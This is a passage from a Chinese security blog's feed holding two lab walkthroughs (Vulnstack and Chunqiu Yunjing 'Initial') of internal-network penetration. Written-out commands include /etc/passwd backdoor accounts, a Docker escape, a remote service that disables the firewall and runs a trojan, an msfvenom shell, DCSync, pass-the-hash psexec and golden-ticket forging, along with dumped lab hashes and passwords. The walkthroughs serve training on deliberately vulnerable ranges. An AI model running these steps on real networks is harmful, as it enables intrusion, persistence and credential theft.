127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果真在docker环境里<br><img src="/Rxi134_FILE/a309f4c888102752232fb3451e5877dd_MD5.jpeg"></p><h2 id="docker逃逸（特权模式）"><a href="#docker逃逸（特权模式）" class="headerlink" title="docker逃逸（特权模式）"></a>docker逃逸（特权模式）</h2><p><img src="/Rxi134_FILE/6d4ca50e62f8d898a4113a5292a501cb_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test <span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功逃逸到宿主机，只有用户ubuntu和root<br><img src="/Rxi134_FILE/0b934d83681779a4e07c3145ed0907ff_MD5.jpeg"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="失败思路1-修改-etc-passwd直接root-ssh"><a href="#失败思路1-修改-etc-passwd直接root-ssh" class="headerlink" title="失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh"></a>失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh</h3><p>修改passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是无法ssh上去<br><img src="/Rxi134_FILE/100477502cab9435adb13719df71db50_MD5.jpeg"></p><p>查看sshd_config，原来是禁用了root ssh</p><h3 id="失败思路2-拿走私钥文件直接ssh"><a href="#失败思路2-拿走私钥文件直接ssh" class="headerlink" title="失败思路2. 拿走私钥文件直接ssh"></a>失败思路2. 拿走私钥文件直接ssh</h3><p>私钥文件有密码原语，解不开<br><img src="/Rxi134_FILE/6171339c219a84d2cb82acfad7ac5927_MD5.jpeg"></p><h3 id="成功思路3-创建普通用户，ssh上去再提升到root"><a href="#成功思路3-创建普通用户，ssh上去再提升到root" class="headerlink" title="成功思路3. 创建普通用户，ssh上去再提升到root"></a>成功思路3. 创建普通用户，ssh上去再提升到root</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> hacker <span class="token number">123456</span><span class="token variable">$1</span><span class="token variable">$hacker</span><span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bashhacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hacker:\<span class="token variable">$1</span>\<span class="token variable">$hacker</span>\<span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>su rxi134<br><img src="/Rxi134_FILE/930f8e22fd8868e1bbdce41aef1f9629_MD5.jpeg"></p><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p><img src="/Rxi134_FILE/6b35d8a0fc2be78c01770cdc0b92d82a_MD5.jpeg"></p><h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>喜欢用chisel<br><img src="/Rxi134_FILE/9b83bce5f65cf23056eebea5735c93c7_MD5.jpeg"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p>内网 ip 为 192.168.183.128，存在内网网段 192.168.183.0&#x2F;24<br><img src="/Rxi134_FILE/03c55c88c226fd1feab4204dac98fc63_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan(icmp) Target 192.168.183.131 is alive(icmp) Target 192.168.183.130 is alive(icmp) Target 192.168.183.134 is alive[*] Icmp alive hosts len is: 3192.168.183.134:139 open192.168.183.134:135 open192.168.183.130:139 open192.168.183.130:135 open192.168.183.131:22 open192.168.183.130:88 open192.168.183.134:445 open192.168.183.130:445 open[*] alive ports len is: 8start vulscan[*] NetInfo [*]192.168.183.134   [->]TESTWIN7-PC   [->]192.168.183.134[*] NetInfo [*]192.168.183.130   [->]WIN-ENS2VR5TR3N   [->]192.168.183.130[+] MS17-010 192.168.183.130(Windows Server 2008 HPC Edition 7601 Service Pack 1)[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1[+] MS17-010 192.168.183.134(Windows 7 Enterprise 7601 Service Pack 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="永恒之蓝拿下用户机"><a href="#永恒之蓝拿下用户机" class="headerlink" title="永恒之蓝拿下用户机"></a>永恒之蓝拿下用户机</h2><p>proxychains走代理，msf打永恒之蓝</p><p>我的wsl出了点问题，先用kali继续</p><ul><li><p>尝试：chisel搭建隧道，proxychains+msf<br>?<br><img src="/Rxi134_FILE/d89f18c8c860f96dfdd30b985838fdf9_MD5.jpeg"></p></li><li><p>尝试：chisel搭建隧道，setg+msf<br><img src="/Rxi134_FILE/fb10a599aa9ce08d65dbd1294cff88d2_MD5.jpeg"><br>nnd终于成功了，拿下 TESTWIN7-PC</p></li></ul><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 TESTWIN7-PCOS Name:                   Microsoft Windows 7 企业版OS Version:                6.1.7601 Service Pack 1 Build 7601OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          testwin7Registered Organization:Product ID:                00392-918-5000002-85176      Original Install Date:     2019/12/31, 10:38:42System Boot Time:          2024/11/13, 17:27:48System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             zh-cn;Chinese (China)Input Locale:              zh-cn;Chinese (China)Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi   Total Physical Memory:     2,047 MBAvailable Physical Memory: 1,483 MBVirtual Memory: Max Size:  4,095 MBVirtual Memory: Available: 3,415 MBVirtual Memory: In Use:    680 MBPage File Location(s):     C:\pagefile.sysDomain:                    demo.comLogon Server:              N/AHotfix(s):                 37 Hotfix(s) Installed.                           [01]: KB2491683                           [02]: KB2534111                           [03]: KB2564958                           [04]: KB2621440                           [05]: KB2653956                           [06]: KB2654428                           [07]: KB2698365                           [08]: KB2705219                           [09]: KB2736422                           [10]: KB2813430                           [11]: KB2900986                           [12]: KB2937610                           [13]: KB2943357                           [14]: KB2978120                           [15]: KB2984972                           [16]: KB2992611                           [17]: KB2999226                           [18]: KB3004375                           [19]: KB3010788                           [20]: KB3023215                           [21]: KB3031432                           [22]: KB3035126                           [23]: KB3037574                           [24]: KB3045685                           [25]: KB3046269                           [26]: KB3072305                           [27]: KB3074543                           [28]: KB3086255                           [29]: KB3097989                           [30]: KB3101722                           [31]: KB3108371                           [32]: KB3122648                           [33]: KB3127220                           [34]: KB3155178                           [35]: KB4019990                           [36]: KB4040980                           [37]: KB976902Network Card(s):           1 NIC(s) Installed.                           [01]: Intel(R) PRO/1000 MT Network Connection                                 Connection Name: 本地连接                                 DHCP Enabled:    Yes                                 DHCP Server:     192.168.183.254                                 IP address(es)                                 [01]: 192.168.183.163                                 [02]: fe80::4c2e:5407:57a4:6774<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>net user</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">net userUser accounts for \\-------------------------------------------------------------------------------Administrator            Guest                    testclone                The command completed with one or more errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p><img src="/Rxi134_FILE/6389f0a064aef1e980bf82e49c8e0a7c_MD5.jpeg"><br>抓取到一个域用户</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEMO.COM\douser:Dotest123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用远程桌面</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee749addb2577ec9d67e3c2cf2f68e94_MD5.jpeg"></p><p>psexec也不行，这个用户权限很低</p><h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>powershell和exe都执行不了<br><img src="/Rxi134_FILE/e2bf6b25542ad8d2f95f89e951443530_MD5.jpeg"><br><img src="/Rxi134_FILE/1c0c79ea710ccf955aa70a858c8485be_MD5.jpeg"></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>可以注入 douser 进程<br><img src="/Rxi134_FILE/c8931aa921f9970f739345226ea4ed55_MD5.jpeg"></p><h2 id="上线CS-1"><a href="#上线CS-1" class="headerlink" title="上线CS"></a>上线CS</h2><p>利用socat转发端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat <span class="token parameter variable">-d</span> TCP4-LISTEN:80,fork TCP4:192.168.74.149:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/947ec3d4750c8e1317bbed6d7bb3283e_MD5.jpeg"></p><p>生成一个stagerless木马，反弹到 web机 的内网ip<br><img src="/Rxi134_FILE/86f39596d404cd86cbbac7bf1e8679b7_MD5.jpeg"></p><h2 id="ms14-068提升至域管"><a href="#ms14-068提升至域管" class="headerlink" title="ms14-068提升至域管"></a>ms14-068提升至域管</h2><p>demo\douser的SID：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS&gt; whoami &#x2F;alldemo\douser S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>域名全称为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEOM.COM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成伪造的ccache票据</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/8333a0c0d7a7ed970b5c42410804547e_MD5.jpeg"></p><p>445端口好像有问题（可能是永恒之蓝打坏了），ipc挂载不了</p><p>上传mimikatz和伪造的票据<br><img src="/Rxi134_FILE/14b2b4b286ee467d68f1e9619bb4db36_MD5.jpeg"></p><p>runas 移动到 demo.com\dousr 用户<br><img src="/Rxi134_FILE/d578b807b9be56dd55a96d62d70d22f0_MD5.jpeg"></p><p>导入票据到内存<br><img src="/Rxi134_FILE/48ec8dacc2be34ab01d0f38cc2419e94_MD5.jpeg"></p><p>芜湖<br><img src="/Rxi134_FILE/cb3088967ed54dcc07ebfba95ef5a243_MD5.jpeg"></p><h2 id="ipc-sc尝试拿下域控"><a href="#ipc-sc尝试拿下域控" class="headerlink" title="ipc+sc尝试拿下域控"></a>ipc+sc尝试拿下域控</h2><p>ipc搭配sc，顺便把防火墙关了</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\WIN-ENS2VR5TR3N\ipc$copy muma.exe \\WIN-ENS2VR5TR3N\c$dir \\WIN-ENS2VR5TR3N\c$ |findstr mumasc \\WIN-ENS2VR5TR3N create firewalldown binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot; start&#x3D; auto sc \\WIN-ENS2VR5TR3N create muma binpath&#x3D; &quot;c:\muma.exe&quot; start&#x3D; autosc start firewalldownsc start muma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是cobaltstrike上线一会就断掉了，不明所以，登上桌面看看<br><img src="/Rxi134_FILE/3cb6c9fbaf1bcec7836d88df0226c512_MD5.jpeg"><br>🤔</p><h2 id="ipc-at拿下域控"><a href="#ipc-at拿下域控" class="headerlink" title="ipc+at拿下域控"></a>ipc+at拿下域控</h2><p>创建计划任务来执行木马</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\&gt;net time \\WIN-ENS2VR5TR3N\\WIN-ENS2VR5TR3N 的当前时间是 2024&#x2F;11&#x2F;16 20:55:10C:\&gt;at \\WIN-ENS2VR5TR3N 20:55:30 C:\ma2.exe新加了一项作业，其作业 ID &#x3D; 2C:\&gt;at \\WIN-ENS2VR5TR3N状态 ID     日期                    时间          命令行-------------------------------------------------------------------        1   明天                    20:51         C:\ma2.exe        2   今天                    20:55         C:\ma2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爽了<br><img src="/Rxi134_FILE/8dd49eb4052f992ac0674c44efaa3806_MD5.jpeg"></p><p>hashdump抓取krbtgt hash</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:97dab5a8641ed01e064a6c3957980405:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c4ed692473d4b4344c3ba01c5e6cb63:::douser:1103:aad3b435b51404eeaad3b435b51404ee:bc23b0b4d5bf5ff42bc61fb62e13886e:::WIN-ENS2VR5TR3N$:1000:aad3b435b51404eeaad3b435b51404ee:61562eb872832ff0d87e1c7ab6daeac2:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mimikatz抓取到明文密码（因为密码过期，所以我事先改掉了），<code>DEMO.COM\administrator:Test20088</code><br><img src="/Rxi134_FILE/08d1f8b77d203a94687218320330daa3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Initial</title>
      <link href="/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p></blockquote><ul><li>DCSync</li><li>CVE</li><li>域渗透<br><img src="/Rxi134_FILE/58142e8af4ac2508452353c3efc22aee_MD5.jpeg"></li></ul><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h1 id="web机器-thinkphp"><a href="#web机器-thinkphp" class="headerlink" title="web机器 thinkphp"></a>web机器 thinkphp</h1><p>先访问80端口</p><p>这图标，一眼thinkphp<br><img src="/Rxi134_FILE/5e7826534b99fb53ddd61360c2a3a6d4_MD5.jpeg"></p><p>制造报错测试下版本，5.0.23<br><img src="/Rxi134_FILE/00dff5ba3574fba90599582655f09181_MD5.jpeg"></p><p><img src="/Rxi134_FILE/780ce7e44c999bac5d117f4c23cede90_MD5.jpeg"></p><p>命令执行无回显，简单上个 webshell 算了<br><img src="/Rxi134_FILE/f3dfea2fae5cf0ca1abd0d8dfe30fad4_MD5.jpeg"><br><img src="/Rxi134_FILE/db37dff6f2590695f6ab6e1a2eb6ecf7_MD5.jpeg"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>就不用vps了，生成木马正连拿shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1314</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> ma.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/3573133e86af79eea1f554587fee6631_MD5.jpeg"></p><p>web机安装了python3，起一个伪终端好看些</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a25cbcb0339ff03fd89542d24750705c_MD5.jpeg"></p><p>但是我没找到flag，可能要提权之类的叭<br><img src="/Rxi134_FILE/03dd59110e803af6aebaa8326e8b9ac3_MD5.jpeg"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>linpeas先搜集一波<br><img src="/Rxi134_FILE/a032bd1f9d1a0bd6321be5b68870fc12_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="获取flag1"><a href="#获取flag1" class="headerlink" title="获取flag1"></a>获取flag1</h2><p><img src="/Rxi134_FILE/62f6f43f91f8060c23aba72a4cff2be2_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时上线msf<br><img src="/Rxi134_FILE/d0a08cdc13a78ecea6f64d241c7a7d95_MD5.jpeg"></p><h1 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h1><p>看下内网网段，172.22.1.0&#x2F;24<br><img src="/Rxi134_FILE/e6204f90bf4c56e834ea7608176988ee_MD5.jpeg"></p><p>传个fscan，一键日内网<br><img src="/Rxi134_FILE/6135163d1bc1d91b05add6e361da8c0f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive(icmp) Target 172.22.1.15     is alive(icmp) Target 172.22.1.21     is alive(icmp) Target 172.22.1.18     is alive[*] Icmp alive hosts len is: 4172.22.1.21:135 open172.22.1.2:135 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetInfo [*]172.22.1.18   [->]XIAORANG-OA01   [->]172.22.1.18[*] NetInfo [*]172.22.1.2   [->]DC01   [->]172.22.1.2[*] NetInfo [*]172.22.1.21   [->]XIAORANG-WIN7   [->]172.22.1.21[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1已完成 14/14[*] 扫描结束,耗时: 11.06878218s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结下来内网有4台机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.1.2 dc172.22.1.15 我172.22.1.21 win2008，可能受到ms17-010的影响172.22.1.18 信呼oa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h1><p>上传个ew作为内网代理，方便访问oa</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">20000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常连接<br><img src="/Rxi134_FILE/93a16a7df364219e72aa7c8660dec2cc_MD5.jpeg"></p><h1 id="添加session路由"><a href="#添加session路由" class="headerlink" title="添加session路由"></a>添加session路由</h1><p>方便把我们的msf流量带入内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.1.0/24run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/812867c1e169a922cd715a7ebc5412ac_MD5.jpeg"></p><h1 id="172-22-1-21-XIAORANG-WIN7永恒之蓝"><a href="#172-22-1-21-XIAORANG-WIN7永恒之蓝" class="headerlink" title="172.22.1.21 XIAORANG-WIN7永恒之蓝"></a>172.22.1.21 XIAORANG-WIN7永恒之蓝</h1><p>先打下poc<br><img src="/Rxi134_FILE/f3ace0e2067cd9eef98aeac432605841_MD5.jpeg"></p><p>准备正连打永恒之蓝</p><p>但是利用session路由无法getshell，目前原因不明，感觉有可能是web机正连的原因🤔<br><img src="/Rxi134_FILE/d81a4b13f08ec3a482a79365d96c03de_MD5.jpeg"></p><p>proxychains就可以，这里因为ew老是断，代理换成了chisel<br><img src="/Rxi134_FILE/f95ab55548d00842facf4f4a8f80c32d_MD5.jpeg"><br><img src="/Rxi134_FILE/fd696530353cc7ce72132193d783c0b0_MD5.jpeg"></p><p>不过我没找到flag<br><img src="/Rxi134_FILE/6f49749112f09825c67fa48aa0b41488_MD5.jpeg"></p><p>而且无法弹出shell…<br><img src="/Rxi134_FILE/4f67bf4c0c360c1006d080e416d576e1_MD5.jpeg"></p><h2 id="域控同步滥用-mimikatz抓取"><a href="#域控同步滥用-mimikatz抓取" class="headerlink" title="域控同步滥用+mimikatz抓取"></a>域控同步滥用+mimikatz抓取</h2><p>msf自带kiwi模块，咱就不用手动上传了，很方便</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是只抓取到机器用户的NTLM哈希，没啥用<br><img src="/Rxi134_FILE/dc49e620262033bfc1e8c4b8d34e3bcb_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">XIAORANG-WIN7$NTLM：5dbcc8e0fa12e4aa99b7447bfa087add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过我们都是SYSTEM用户了，可以直接利用 DCSync，伪造我们是一个域控发出同步申请，从而获取域用户哈希</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[DC] 'xiaorang.lab' will be the domain[DC] 'DC01.xiaorang.lab' will be the DC server[DC] Exporting domain 'xiaorang.lab'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        5121000    DC01$   94c59dda4a0ec229d4b4cf45dba98dbf        5324801104    XIAORANG-OA01$  dc5f050393a7cc83e0518b8015b8b65d        4096500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121108    XIAORANG-WIN7$  8b7dea43bed4b560504e925f0f1b5efd        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="172-22-1-2-DC01"><a href="#172-22-1-2-DC01" class="headerlink" title="172.22.1.2 DC01"></a>172.22.1.2 DC01</h1><h2 id="pth-psexec拿下域控"><a href="#pth-psexec拿下域控" class="headerlink" title="pth+psexec拿下域控"></a>pth+psexec拿下域控</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psexec.exe xiaorang.lab/administrator@172.22.1.2 <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:10cf89a850fb1cdbe6bb432b859164c8 -dc-ip <span class="token number">172.22</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee9dcfd5a0bc36581cf73b44edbc1ba5_MD5.jpeg"></p><h2 id="获取flag3"><a href="#获取flag3" class="headerlink" title="获取flag3"></a>获取flag3</h2><p><img src="/Rxi134_FILE/7981278fa41cc9988280d60ad8cd5c40_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="权限维持（黄金票据）"><a href="#权限维持（黄金票据）" class="headerlink" title="权限维持（黄金票据）"></a>权限维持（黄金票据）</h2><p>我们已经有krbtgt账户的NT hash，以此来制作黄金票据实现域权限维持</p><p>查看域SID</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Windows\system32>powershell -c "(Get-ADDomain).DomainSID"BinaryLength AccountDomainSid                         Value------------ ----------------                         -----          24 S-1-5-21-314492864-3856862959-4045974917 S-1-5-21-314492864-385...C:\Windows\system32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>制作黄金票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ticketer.py -domain-sid S-1-5-21-314492864-3856862959-4045974917 <span class="token parameter variable">-nthash</span> fb812eea13a18b7fcdb8e6d67ddc205b <span class="token parameter variable">-domain</span> xiaorang.lab administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导入票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache<span aria-hidden="true" 